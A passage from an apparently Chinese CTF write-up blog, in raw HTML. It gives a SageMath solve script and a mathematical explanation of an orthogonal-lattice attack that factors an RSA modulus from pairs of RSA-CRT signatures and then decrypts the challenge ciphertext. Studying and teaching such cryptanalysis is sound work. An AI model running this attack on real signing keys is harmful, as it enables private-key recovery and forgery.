class=\"line\"><span class=\"string\">enc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>出题论文：<a href=\"https://eprint.iacr.org/2011/388.pdf\">https://eprint.iacr.org/2011/388.pdf</a><br>这题一开始是搜到了论文，瞟了两眼，以为不是，就没看下去了。。。<br>后来学长发给我这篇，我焯了两个钟复现出来了，说不定真有机会现场解出，唉还是太菜。<br>照着论文的 Attack Summary 敲就行了，一开始没理解到 $z$ 向量的意思，直接从格子拿，跑不出来，学长问我 $a$ 和 $b$ 的选取是不是有问题，我才知道要枚举出所有 $x$ 和 $y$ 。然后 $a$ 和 $b$ 在 0 到 10 间选取也不行，改成了 -10 到 10 。<br>exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> combinations</span><br><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">co_sig = [<span class=\"string\">b&quot;\\x17\\x8bb3\\x11\\x1b\\xb9\\xb9\\xc6M\\xb0\\xaa\\x07-\\x1ar\\xff\\xfb\\xb4&amp;H7!\\xb8\\xa1\\xce\\x07\\x8b\\x84M\\x0bw=m\\x193Oc\\x97w\\x8f\\xffy4\\xa1\\x99\\xfcW\\xf9|\\xeb\\xa4\\x00\\x1eD*\\xe8-&#x27;\\xa9\\xef\\x9d\\x13*\\xf4\\xbe\\x9d\\x9b&amp;w\\xcb\\xfd\\xb3\\xb6\\xa3n\\xb8\\xb4\\x97vT\\xec@\\x86\\xd1R\\xb0\\n\\xe1uC\\xbc\\x14\\xeb\\xceSu&amp;&#x27;&#123;\\xb9\\x12\\x90\\x82\\xc7,\\xdbr\\xebP\\xe1j\\x11E\\xd5\\x17\\xe1\\xd0D\\xe7z\\x94vt\\xbf\\x1a\\xc4+&quot;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;\\x1dJ\\xc5\\xb2\\xbe\\x05\\xe6\\xc8T\\n\\xbe&quot;\\xbeU\\xed\\xba\\xec\\x85\\x05\\x8b\\x8ayE\\xa3&#125;0\\x1dk\\xa7\\x10\\xe2E\\x19\\xfe\\x10\\x90\\xef\\r\\xdbV\\x8b\\x87|(\\xd1\\xb5\\xfd\\xb9\\x14\\x84\\x05\\x03\\x81\\xc8\\xf6\\xe5\\x8a\\x92\\xa0\\x01I\\x8aG:\\xc19\\x9e\\xf0\\x8eZ\\\\Yx\\x80|\\xb7\\x80\\x0e\\xcd\\xa3\\xba6\\xf8\\x98\\xb1pB\\x05\\x8aT#\\xbf\\x1e\\x1b~\\xcb\\xf5\\t\\xa2H9\\xc9n\\x81e\\xa2\\x15\\x97\\x11\\xe4\\x93\\xf2\\xe6\\x80\\x97\\x99G\\xb5\\xfe\\x07/\\xd2\\xbd\\xad\\xcf\\x04\\x9e\\xd0&#x27;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;Gs\\xda\\xb8\\x8a\\x85\\xccK\\xf7\\xa8y\\x16\\xa5\\xf0\\x06\\xbe\\xeb\\x83&amp;&#125;a\\x85q\\x8d:\\x1fSb\\xb8\\xc5\\x84\\xba*[\\xe7\\xbb&#123;\\x86\\xd3\\xb3r\\xb6\\xaaCN\\x93\\x1d&lt;(\\xe2\\x1c;\\x8crU\\x8fD=W\\xa7\\x0b\\xc7\\xeag\\x96\\x06\\xd6\\xbb\\xe4\\x04b\\xd8\\x02\\x12\\xd6\\xfa2\\x1e#\\xf0\\xde\\x8b\\x88M\\xd2\\xf47\\\\\\x98\\xe0\\x04Fu\\x1bsy\\xf2\\xc4\\xad\\xd6Y\\x81u~B:\\xd2\\x1f\\xb3\\xab\\x01:\\xfa\\xdf\\x19J8\\xd0\\x18RN\\xfe,CA\\x15\\xb3\\xe0&#x27;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&quot;0I\\xda5\\x9f\\x05v\\x17\\xdc\\xd4q\\xd6\\x83,\\x9d\\r\\xccc\\x8a\\xa1\\xd4U\\xd3\\x18\\xc9\\xc6g\\xcd\\nX\\x99Ah\\xed&#125;\\xf3\\xb1(\\xd5I\\xc6\\x0f@yw9\\x9d\\xfdv\\x15x\\xeaRA\\xd6\\xb0\\x1e\\xb5B\\xe5\\x05cc\\x06m\\xf4NN&#x27;\\x02q\\x1a\\x11\\xe4\\x87P:\\xc8\\x11a\\x9f\\xbd\\x9c\\x98x\\xda\\xea\\xc4\\xa8f\\x89s\\xcaJ\\x7f\\xeb\\xd8\\xc1G#\\xf4\\xdc\\xe2\\x01\\xf2\\xa5\\x95\\x19`)2!\\xf5\\xb9\\xf0\\xf2\\xbb\\xf8\\x0bF&amp;&amp;`\\xfd*\\xe1\\xf2\\x9c&quot;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;:\\x99/Hxt\\xd1\\xd4\\xaaB\\xd6H\\x16\\xe1\\xc9\\xe2\\xb3\\xc3\\xa9b\\xd3\\x96\\x9c\\x05x6\\xf1\\xc3d\\xa2\\xd1U+.\\x1b\\xac^\\xf6Mh7\\xb7\\x03\\x8e\\xdc\\xca\\x0bn\\xac\\xed\\x92\\xb8x\\x04)\\x0f|\\x11\\xcc\\xfa\\xf2\\\\\\xba\\xee\\xc4X\\xa8(\\x05\\xf2\\xb5\\x8f&amp;\\xf3\\xff\\x1eB\\xe7\\x94\\xf4\\xa6\\x00!\\xe5v\\xd9x\\xf0s\\x94\\xf4D(\\xa9g\\x118\\xa7z\\x83\\xad\\xdb\\xe6\\xe3\\xe7\\xf8\\xf2\\xef\\xe5@\\xe9\\x13\\x00OB\\xcc\\x05\\xd1,_=\\xd2/Og\\x81\\xa6+&#x27;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;\\x1c|\\xb6\\xcc\\xdfj\\xc5\\xa0s\\xac w\\xa6\\xf2\\x87D\\xe3\\xf9Y\\xf5=\\xf0\\x0b\\xd9\\xea\\x89,+e\\x1e\\xb7m#\\x99\\xd1\\x87\\x17Z\\xed\\x1d\\xc8\\x97;\\xa0K\\x05.\\xaa&lt;\\xc6s\\xcf\\xa2\\xa2\\\\PO\\x12&amp;\\xb4\\x11\\xec\\xad\\x10\\xf8\\xf7\\xd1\\xd3_\\x80\\x17\\xe0\\x1eP\\x93\\xe3\\xc2\\x1e\\x03\\xea]^\\xc6a\\x9c\\xcb\\x90\\xbb\\x9f\\x8by\\xa5dhM\\xce\\xc7\\xbc\\xf7\\xafe\\xcf\\xc1\\xf1\\x18@\\x1e\\xe2\\xdb\\xfb\\xe4^\\xc8\\xe7\\x19\\xccnY\\xc6o\\x7fL\\x9fV\\xd4\\xc4\\x15\\xe8&#x27;</span>,</span><br><span class=\"line\">          ]</span><br><span class=\"line\">sig = [<span class=\"string\">b&#x27;\\t\\x8b\\xde\\x98\\x84\\x1d\\x9e\\xd4\\xa0\\xb7f\\xe0\\x05\\xb1\\xbd8\\xb9G\\xe3\\x0c\\x83\\x8a\\xe5\\xf0G7\\x12\\x1eT\\x85o-B\\xe4_\\xd2\\x04\\xd9:\\xab\\xdf\\xa1 \\x8f\\xedt+\\x0f\\xce\\xb5\\x90\\xaaK\\xf0U~v=\\x84\\xe7$G\\xf5\\xfb\\xd3ok~V\\x1a\\xec&amp;\\x15\\x18Y\\x0c\\x80u\\xafF\\xf1\\x10\\x9f\\xf2\\xe6\\xa6\\x9a\\xbb\\xbd+\\xa4l\\xa9\\x11\\xd5\\t\\x13\\x16\\xa3\\xde\\xe1\\xdfZ\\xa9$r\\xb5`\\xc9&quot;\\x11\\xab\\xc5\\x87\\xc4\\x1d@\\x9e\\xa4t\\xdb#\\xbdj\\xcb\\x95\\xefK&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;z/\\xd6\\xfb\\xd8\\xfa\\xc4\\xed\\xbd\\x99\\xd0\\xa0\\x90\\xcb\\xca\\x83\\xd8B\\xa7\\xf4\\xbd\\xe0\\xc2&amp;\\x1aQl(\\xd6p\\x8f\\x89=tT\\xf1(\\xeb\\xab\\x84[oR\\x1fl=\\xda\\xf5\\x18q\\x8f\\xa7k\\x00\\x1b\\x1a\\x0ei\\x1fa.ho\\x15\\x04\\x12\\xe4\\xc2\\xd7\\x19\\x92\\xc3\\x9b\\xfe\\xd5\\xb6R\\xf8\\x95\\x9fr\\x93\\xddD\\x1c[\\x873\\xd5\\x06\\x1b\\xa5\\x82/6\\x9a\\x13\\xcf\\xa4\\xcd\\x0e]\\t\\xad?\\xd6\\x84\\r\\x90\\xef\\x86\\xf15)\\xe34\\xf7\\xb77\\xef\\x0c&amp;\\xdb8\\xa6\\xe0\\xa5a&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;U\\x0b\\xf6\\x9cm])1\\xe2\\xad\\xf9G\\x8f\\xa2\\xbc&#125;\\xd7\\x18\\x89\\xa4\\xfdFQ\\x80m&quot;\\xf9\\to^\\xd9A\\x98\\xd2\\xca\\x1e(b\\xa8\\xbe\\xc2m\\xf7\\n[O\\x00\\xbc\\x87\\x17\\xed\\x0cG\\xf2=H\\x0e\\xc0\\x14+\\xcb\\xd0\\x1feT2\\xf2Th\\xec\\xc2\\xcf&gt;6,&lt;\\x88X\\x8f\\xe9g\\xa8\\x00\\xafr\\x05\\x95\\rj\\x9c\\xc6\\n\\xbb\\x8a\\x019\\xc1\\x1ef#\\x02[Rh\\xd8\\xdc|&#123;6\\xeb\\xe8U\\x91\\xa4\\xeb&#125;\\xf4s;E\\xe72$i\\xdft\\xff\\&#x27;&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;[\\x94\\x95T\\xf4\\xc4\\xca\\x8drO\\x80\\x14\\xc9&lt;H\\xa2a\\xdc\\xf4`\\xac&gt;\\xab\\x03\\xfa\\x80Sx\\x99\\x14\\x83$U\\x0b\\xfa\\x8fv\\xfd\\xda\\x1a\\xa0\\xebY\\xaa\\x01\\xe2XsG\\t\\xcf\\xae\\xa0\\xbf\\x82iG\\tQ \\xb1\\xfe\\xa5k\\x12\\xd9\\x12\\xf7\\x95\\xa3\\xa5\\x8d`z\\x19\\x1a\\x90-\\x9aj\\x15\\xf6f&gt;\\x18\\x08\\xb8\\x1f\\x88\\x1a\\x80Th\\xd0\\x15\\x9bw#\\&#x27;`K\\xa5\\xf1\\xbf&quot;\\xe79\\xaf\\xc7z%p\\xa5\\x9f\\x14\\xef\\&#x27;1\\x11\\x05Gg\\xe9\\xda\\xc9\\x18~[&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;:\\xefRE\\xd7\\xa1?\\xf3\\xb5\\xf7\\xdd\\xe2\\xb6~\\x85014\\xc0\\x8a\\x80\\xe1\\xb5#\\x94\\x10\\xb2\\xa0\\xfe\\x87\\xd1t\\xc3$&amp;\\xde8\\x195\\xcd\\xf4@3\\x15\\xcaK\\xcc\\xcd\\r:\\x83*\\xd7l\\xb6\\xf2&#125; \\tJ\\xb5xKfjh.\\xfb\\xb5\\x91\\xc6\\xf2x\\x8e\\x83\\xdc\\xc3\\xef\\x8b\\x8dW\\xa6\\xa6\\xb0w\\xd8\\xf2G\\xa5-\\xc3\\x87\\x17;\\xedH`:\\xcd\\x08ts\\x9eqPE\\xd7\\xfc\\xc4\\x98\\xb5\\xe0\\xad\\xb7A\\x7f\\xcb\\x01\\xbd\\x98\\xd3Ea\\xb9\\x07\\x80\\xf8\\x19&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&quot;8\\xca\\x7f!;\\\\\\xde\\x1b\\x80i\\x9b!\\x1c??u\\x13\\x955\\xd0xG\\xff\\xd7\\xba\\xfe+\\x95\\x0eu^\\x15\\x1a\\x0e*\\xfe\\x8a\\xafM\\xc0\\xd1Ty\\xd7\\xf1\\xa7@\\xd6\\xa6\\xee\\x0c:It\\x1a\\xeag\\xfc\\x0c\\xaf\\x02&lt;\\x03T)\\xeb\\xb0\\x15\\x1cz\\x85\\x992\\xa9\\xbe\\x9bm\\xc4D\\x83\\xf7\\xb5T\\xdd9?\\x94\\xd4\\x13\\xb4\\xb3\\x8d\\xa9\\x92\\x9dt\\x86\\xdb\\x0b$\\x19l\\xb1\\xb9\\x05&#x27;o\\xf3!\\t\\x01\\x93&#x27;z\\x15P\\x88\\xd7iN\\n\\x8bA\\xb5\\xd2&#125;\\xe8\\x10&quot;</span></span><br><span class=\"line\">       ]</span><br><span class=\"line\">n = <span class=\"number\">99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729</span></span><br><span class=\"line\">N = <span class=\"number\">81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731</span></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\">enc = <span class=\"number\">2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">orthogonal_lattice</span>(<span class=\"params\">B</span>):</span><br><span class=\"line\">    _d, _n = B.nrows(), B.ncols()</span><br><span class=\"line\">    _c = <span class=\"number\">2</span> ** <span class=\"built_in\">min</span>(((_n-<span class=\"number\">1</span>)/<span class=\"number\">2</span>+(_n-_d)*(_n-_d-<span class=\"number\">1</span>)/<span class=\"number\">4</span>), <span class=\"number\">20</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> B:</span><br><span class=\"line\">        _c *= b.norm()</span><br><span class=\"line\">    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))</span><br><span class=\"line\">    B_r = B_bot.transpose().LLL()</span><br><span class=\"line\">    LB = B_r.matrix_from_rows_and_columns(<span class=\"built_in\">range</span>(_n-_d), <span class=\"built_in\">range</span>(_d, _n+_d))</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (B*LB.transpose()).is_zero()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LB</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">v = [crt([bytes_to_long(co_sig[i]), bytes_to_long(sig[i])], [N, n])</span><br><span class=\"line\">     <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">Lv = orthogonal_lattice(matrix(ZZ, v))</span><br><span class=\"line\"></span><br><span class=\"line\">result = orthogonal_lattice(Lv.matrix_from_rows(<span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">6</span>-<span class=\"number\">2</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x, y <span class=\"keyword\">in</span> combinations(result, <span class=\"number\">2</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(-<span class=\"number\">10</span>, <span class=\"number\">10</span>)):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">10</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">            z = a*x+b*y</span><br><span class=\"line\">            <span class=\"keyword\">if</span> z.norm() &gt; sqrt(<span class=\"number\">6</span>*n):</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                vv = vector(v)-z</span><br><span class=\"line\">                <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> vv:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> gcd(i, n) != <span class=\"number\">1</span>:</span><br><span class=\"line\">                        p = gcd(i, n)</span><br><span class=\"line\">                        <span class=\"keyword\">assert</span> n % gcd(i, n) == <span class=\"number\">0</span></span><br><span class=\"line\">                        q = n//p</span><br><span class=\"line\">                        phi = (p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">                        d = inverse_mod(e, phi)</span><br><span class=\"line\">                        m = long_to_bytes(<span class=\"built_in\">int</span>(<span class=\"built_in\">pow</span>(enc, d, n)))</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(m)</span><br><span class=\"line\">                        exit()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>RSA-CRT签名中计算了：<br>$$<br>\\sigma_p=\\mu(m)^d\\mod \\ p \\\\  \\sigma_q=\\mu(m)^d\\mod \\ q<br>$$<br>然后签名 $\\sigma=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta$ ，其中 $\\alpha=q\\cdot(q^{-1}\\mod\\ p)$ ， $\\beta=p\\cdot(p^{-1}\\mod\\ q)$ 。<br>题目中给出 6 对签名，每对签名用 CRT 不难算出<br>$$<br>v=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta \\mod N\\cdot N’<br>$$<br>其中 $\\sigma_p$ 和 $\\sigma_q$ 和 $N/2$ 一个数量级， $\\alpha$ 和 $\\beta$ 又和 $N$ 一个数量级，故右式远小于 $N\\cdot N’$ ，那么<strong>上式在整数域上是成立的</strong>。<br>一对算不出，但是多对可以，组成向量，有：<br>$$<br>\\boldsymbol{v}=\\alpha\\boldsymbol{x}+\\beta\\boldsymbol{y}<br>$$<br>其中 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 是分量 $n/2$ 位的未知向量， $\\alpha$ 和 $\\beta$ 是有关 $p$ 和 $q$ 的 CRT 系数。<br>不难计算出一组与 $\\mathbb{Z}^\\ell$ 中正交于 $\\boldsymbol{v}$ 的向量的格 $\\boldsymbol{v}^\\bot \\in \\mathbb{Z}^\\ell$ 的约化基 ${\\boldsymbol{b}_1,…,\\boldsymbol{b}_{\\ell-1}}$ 。（可能此时你会疑惑为什么是 ${\\ell-1}$ 个向量，下面的拓展里有解释）<br>特别地，我们有：<br>$$<br>\\alpha \\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle + \\beta \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0 \\quad \\mathrm{for} \\ j=1,2,\\ldots,\\ell-1<br>$$<br><del>（也不是很特别的感觉）</del><br>现在观察方程 $\\alpha\\cdot u+\\beta\\cdot v=0$ ，最小的非零解 $(u,v)\\in \\mathbb{Z}^2$ 是 $\\pm(\\beta,-\\alpha)/g$ ，其中 $g=\\gcd(\\alpha,\\beta)$ 盲猜是非常小的（经测试基本在10以内），意味着 $|u|,|v|\\geq\\mathit{\\Omega}(N)$ 中 $\\mathit{\\Omega}$ 常量是非常小的。（啥玩意？）对 $j=1,2,\\ldots,\\ell-1$ ，有以下两种可能：</p>\n<p><strong>情形1</strong>：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle = \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0$ 。此时 $\\boldsymbol{b}_j$ 属于 $\\mathbb{Z}^\\ell$ 中与 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 正交的向量的格 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$</p>\n<p><strong>情形2</strong>：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle$ 和 $\\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle$ 有绝对值 $\\geq \\mathit{\\Omega}(N)$ ，其中 $\\mathit{\\Omega}(N)$ 是一个小常数。因为 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 的范数都不超过 $\\sqrt{\\ell N}$ ，由柯西-施瓦茨不等式，这意味着 $||\\boldsymbol{b}_j||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$</p>\n<p>因为格 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$ 的秩是 $\\ell-2$ ，当全部 $\\ell-1$ 个向量 $\\boldsymbol{b}_j$ 线性无关时情形1不成立，所以最长的 $\\boldsymbol{b}_{\\ell-1}$ 应该在情形2中，因此 $||\\boldsymbol{b}_{\\ell-1}||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$ 。另一方面，其他向量形成一个秩为 $\\ell-2$ 的格，且体积<br>$$<br>V=\\mathrm{vol}(\\mathbb{Z}\\boldsymbol{b}_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2})\\approx\\frac{\\mathrm{vol}(\\boldsymbol{v}^\\bot)}{||\\boldsymbol{b}_{\\ell-1}||}=\\frac{||\\boldsymbol{v}||}{||\\boldsymbol{b}_{\\ell-1}||}\\leq \\frac{\\sqrt{\\ell}\\cdot N^{3/2}}{\\mathit{\\Omega}(\\sqrt{N/\\ell})}=O(\\ell N)<br>$$<br>盲猜是一个随机的格。特别地，我们有：<br>$$<br>||\\boldsymbol{b}_j||=O(\\sqrt{\\ell-2}\\cdot V^{1/(\\ell-2)})=O(\\ell^{1/2+1/(\\ell-2)}\\cdot N^{1/(\\ell-2)})\\quad\\mathrm{for} \\ j=1,2,\\ldots,\\ell-2<br>$$</p>\n<p>一旦 $\\ell \\geq 5$ ，这个长度就远小于 $\\sqrt{N/\\ell}$ 。假设是这种情况，那么对于 $j=1,2,…,\\ell-2$ ， $\\boldsymbol{b}_j$ 应该是情形1中。这意味着这些向量生成 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$ 中一个满秩的子格 $L’=\\mathbb{Z}\\boldsymbol{b}_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2}$ 。<br>取正交格，我们得到 $(L’)^\\bot \\supset L^\\bot=\\mathbb{Z}\\boldsymbol{x}\\oplus\\mathbb{Z}\\boldsymbol{y} $。因此， $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 属于 $L’$ 的正交格 $(L’)^\\bot$ 。令 ${\\boldsymbol{x’},\\boldsymbol{y’}}$ 为一组该格的约化基，我们可以枚举 $(L’)^\\bot$ 中的长度不超过 $\\sqrt{\\ell N}$ 且为 $\\boldsymbol{x’}$ 和 $\\boldsymbol{y’}$ 线性组合的所有格向量。高斯启发式表明这大约为：<br>$$<br>\\frac{\\pi(\\sqrt{\\ell N})^2}{\\mathrm{vol}((L’)^\\bot)}=\\frac{\\pi\\ell N}{V}=O(1)<br>$$<br>这样的向量，所以这肯定是可行的。对这些向量 $\\boldsymbol{z}$ ，我们计算 $\\gcd(\\boldsymbol{v}-\\boldsymbol{z},N)$ 。我们将因此很快在其中找到 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)$ ，因为 $\\boldsymbol{x}$ 是一个 $(L’)^\\bot$ 中长度 $\\leq\\sqrt{\\ell N}$ 的向量。但根据 $\\boldsymbol{v}$ 的定义，我们有：<br>$$<br>\\boldsymbol{v}=\\boldsymbol{x}\\mod p\\\\<br>\\boldsymbol{v}=\\boldsymbol{y}\\mod q<br>$$<br>故 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)=p$ ，从而分解 $N$ 。</p>\n<h3 id=\"拓展阅读-正交格\"><a href=\"#拓展阅读-正交格\" class=\"headerlink\" title=\"拓展阅读-正交格\"></a>拓展阅读-正交格</h3><p>令 $\\mathbf{b}_1,…,\\mathbf{b}_d$ 为 $\\mathit{\\Lambda}$ （这玩意念Lambda）中的向量。如果这 $d$ 个向量在 $\\mathbf{Z}$ 上线性无关且 $\\mathit{\\Lambda}$ 中的任意元素可以由 $\\mathbf{b}_i$ 整系数线性表出，则这 $d$ 个向量形成 $\\mathit{\\Lambda}$ 中的一组基。 $\\mathit{\\Lambda}$ 中至少存在一组基。 $\\mathit{\\Lambda}$ 的基都有相同的基数，称为 $\\mathit{\\Lambda}$ 的维度。</p>\n<p>如果 $\\mathit{\\Omega}$ 包含 $\\mathit{\\Lambda}$ ，且两者有相同的维度，则称 $\\mathit{\\Lambda}$ 为 $\\mathit{\\Omega}$ 在 $\\mathbf{Z}^n$ 上的一个子格。（子格的定义？） $\\mathit{\\Lambda}$ 的所有基张成相同的 $\\mathbf{Q}^n$ 的 $Q$ 向量子空间（啥玩意？），记为 $E_{\\mathit{\\Lambda}}$ 。 $\\mathbf{Q}^n$ 上 $E_{\\mathit{\\Lambda}}$ 的维度与 $\\mathit{\\Lambda}$ 的维度相同。令格 $\\overline{\\mathit{\\Lambda}}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 。 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 的一个子格。如果 $\\mathit{\\Lambda}=\\overline{\\mathit{\\Lambda}}$ ，那么我们称 $\\mathit{\\Lambda}$ 是一个完备格，特别的， $\\overline{\\mathit{\\Lambda}}$ 是一个完备格。</p>\n<blockquote>\n<p>笔者注记：<br>这里首先将 $\\mathit{\\Lambda}$ 张成一个<strong>有理数空间</strong>，不局限于<strong>整系数</strong>向量组合了，记为 $E_{\\mathit{\\Lambda}}$ 的E我猜是<strong>欧几里得</strong>的意思？然后与 $\\mathbf{Z}^n$ 相交得到的是整数点集合 $\\overline{\\mathit{\\Lambda}}$ ，如此 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 子格的事应该挺自然的。然后如果两者相等，想象一下，都那样张成了都找不到新的点，那这个格确实也挺完备。<br>PS:发现自己念了十年的欧几里得，难怪输入法打不出来（）</p>\n</blockquote>\n<p>令 $(\\mathbf{x},\\mathbf{y})\\rightarrow\\mathbf{x}.\\mathbf{y}$ 为一般意义上的欧里几德内积， $||.||$ 是它对应的范数 <del>（奇怪的表示方法）</del>。令 $F=(E_{\\mathit{\\Lambda}})^-$ 是关于该内积的正交向量子空间。我们定义正交格 $\\mathit{\\Lambda}^-=F\\cap\\mathbf{Z}^n$ 。因此， $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格，其维度为 $n-d$ 。这意味着 $(\\mathit{\\Lambda}^-)^-$ 等于 $\\overline{\\mathit{\\Lambda}}$ 。令 $\\mathcal{B}=(\\mathbf{b}_1,…,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基。</p>\n<blockquote>\n<p>笔者注记：<br>看到这就有点迷糊了，捋一捋： $E_{\\mathit{\\Lambda}}$ 是 $\\mathit{\\Lambda}$ 张成出的有理空间，然后 $F$ 是其正交向量子空间，即<strong>任意从 $\\mathit{\\Lambda}$ 和 $F$ 分别抓两个向量出来，其内积都为 $0$</strong> 。<br>再然后 $\\mathit{\\Lambda}^-$ 是 $F$ 的一个子格，<strong>注意到 $\\mathit{\\Lambda}^-$ 把 $F$ 所有整数点都框进去了</strong>，这就很有意思了，由上面的定义就不难得出正交格 $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格。<br>至于其维度为何是 $n-d$ ，有个概念叫<strong>正交补</strong>，就是正交空间的维数是刚刚好的，对于列空间维数为 $r$ 的矩阵 $A_{r\\times m}$ ，其左零空间的维数是 $m-r$ ，相加恰好为 $m$ 。举例来说，三维中与线正交的是二维空间，与面正交的是一维空间。<br>这篇 paper 习惯用 $E^-$ 表示正交向量子空间，但似乎 